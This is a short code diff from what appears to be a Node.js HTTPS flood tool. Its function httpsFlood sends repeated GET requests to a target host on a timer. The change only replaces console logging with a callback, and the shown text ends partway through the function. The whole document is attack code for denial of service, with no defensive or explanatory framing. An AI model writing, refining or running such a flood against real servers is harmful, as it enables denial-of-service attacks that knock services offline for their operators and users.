@@ -1,6 +1,6 @@
 const https = require('https');
 
-function httpsFlood(target, rateLimit) {
+function httpsFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const req = https.request({
             hostname: target,
@@ -9,12 +9,12 @@ function httpsFlood(target, rateLimit) {
             method: 'GET'
         }, (res) => {
             res.on('data', (chunk) => {
-                console.log('Received: ' + chunk);
+                logOutput('Received: ' + chunk);
             });
         });
 
         req.on('error', (err) => {
-            console.error('Error: ' + err.message);
+            logOutput('Error: ' + err.message);
         });
 
         req.end();
